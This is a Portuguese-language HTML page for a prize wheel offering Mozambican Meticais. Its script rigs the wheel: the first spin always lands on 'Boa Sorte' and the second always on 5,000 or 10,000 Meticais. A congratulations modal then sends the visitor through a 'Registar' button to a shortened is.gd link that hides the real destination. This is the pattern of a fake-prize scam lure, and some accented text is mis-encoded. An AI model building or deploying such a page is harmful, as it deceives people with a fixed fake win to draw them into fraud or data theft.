<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Roleta da Sorte</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to bottom, #ffeaa7, #fab1a0);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }

    .roleta-container {
      position: relative;
      width: 400px;
      height: 400px;
    }

    .seta {
      position: absolute;
      left: -40px;
      top: 50%;
      transform: translateY(-50%);
      width: 0;
      height: 0;
      border-top: 20px solid transparent;
      border-bottom: 20px solid transparent;
      border-right: 40px solid red;
      z-index: 10;
    }

    .roleta {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 10px solid gold;
      position: relative;
      transition: transform 5s cubic-bezier(0.33, 1, 0.68, 1);
      background: conic-gradient(
        #ffeaa7 0deg 45deg, #fdcb6e 45deg 90deg,
        #ffeaa7 90deg 135deg, #fdcb6e 135deg 180deg,
        #ffeaa7 180deg 225deg, #fdcb6e 225deg 270deg,
        #ffeaa7 270deg 315deg, #fdcb6e 315deg 360deg
      );
    }

    .valor {
      position: absolute;
      width: 100%;
      text-align: center;
      top: 50%;
      transform-origin: bottom center;
      font-weight: bold;
    }

    .botao-girar {
      margin-top: 30px;
      padding: 12px 30px;
      font-size: 18px;
      background-color: #e17055;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .botao-girar:hover {
      background-color: #d35400;
    }

    .modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-color: rgba(0,0,0,0.6);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 100;
    }

    .modal-conteudo {
      background: white;
      padding: 30px;
      text-align: center;
      border-radius: 12px;
    }

    .modal-conteudo button {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 16px;
      background: green;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="roleta-container">
    <div class="seta"></div>
    <div class="roleta" id="roleta">
      <!-- Os textos ser√£o inseridos por JavaScript -->
    </div>
  </div>

  <button class="botao-girar" onclick="girarRoleta()">GIRAR</button>

  <div class="modal" id="modal">
    <div class="modal-conteudo" id="modal-conteudo">
      <p>Parab√©ns!</p>
      <button id="botao-modal">Registar</button>
    </div>
  </div>

  <audio id="som-vitoria" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_f1cf2ed8ab.mp3" preload="auto"></audio>

  <script>
    const setores = ['10 Meticais', '100 Meticais', '200 Meticais', '500 Meticais', '1000 Meticais', 'Boa Sorte', '5000 Meticais', '10000 Meticais'];
    const roleta = document.getElementById('roleta');
    const somVitoria = document.getElementById('som-vitoria');
    let tentativas = 0;
    let anguloAtual = 0;

    // Criar textos
    setores.forEach((texto, i) => {
      const div = document.createElement('div');
      div.classList.add('valor');
      div.style.transform = `rotate(${i * 45}deg) translateY(-180px)`;
      div.innerText = texto;
      roleta.appendChild(div);
    });

    function girarRoleta() {
      if (tentativas >= 2) return;

      const giros = 5;
      let alvo;

      if (tentativas === 0) {
        alvo = setores.indexOf('Boa Sorte');
      } else if (tentativas === 1) {
        alvo = Math.random() < 0.5 ? setores.indexOf('5000 Meticais') : setores.indexOf('10000 Meticais');
      }

      const anguloDestino = 360 * giros + (360 - alvo * 45) + Math.floor(Math.random() * 20 - 10);
      anguloAtual += anguloDestino;

      roleta.style.transform = `rotate(${anguloAtual}deg)`;

      setTimeout(() => {
        tentativas++;

        if (tentativas === 1) {
          mostrarModal('Resultado: Boa Sorte!', 'Girar Novamente');
        } else if (tentativas === 2) {
          somVitoria.play();
          mostrarModal('Parab√©ns! Voc√™ ganhou at√© 10.000 Meticais üéâ', 'Registar');
        }
      }, 5200);
    }

    function mostrarModal(msg, botaoTexto) {
      const modal = document.getElementById('modal');
      const conteudo = document.getElementById('modal-conteudo');
      conteudo.querySelector('p').innerText = msg;
      const botao = conteudo.querySelector('button');
      botao.innerText = botaoTexto;

      botao.onclick = () => {
        modal.style.display = 'none';
        if (botaoTexto === 'Registar') {
          window.location.href = "https://is.gd/hHdRiZ";
        }
      };

      modal.style.display = 'flex';
    }
  </script>
</body>
</html>
